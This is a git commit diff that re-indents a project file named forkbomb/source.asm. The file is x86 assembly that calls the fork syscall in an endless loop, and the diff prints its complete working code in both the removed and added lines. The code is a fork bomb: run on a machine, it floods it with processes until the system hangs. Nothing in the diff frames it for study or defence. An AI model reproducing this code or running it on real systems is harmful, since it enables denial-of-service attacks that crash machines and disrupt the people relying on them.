31f7391ef5cd27cc484de641cb235dce80fb3883
OptimisticSide <47266822+optimisticside@users.noreply.github.com>
2021-01-13 07:57:45 -0800

    Fixed indentation

--- forkbomb/source.asm
+++ forkbomb/source.asm
@@ -1,7 +1,7 @@
 section.text:
-  global _start
+    global _start
 
 _start:
-  mov eax, 2  ; syscall number for fork
-  int 0x80    ; issue a syscall and call kernel
-  jmp _start  ; jump back to start and repeat
+    mov eax, 2  ; syscall number for fork
+    int 0x80    ; issue a syscall and call kernel
+    jmp _start  ; jump back to start and repeat
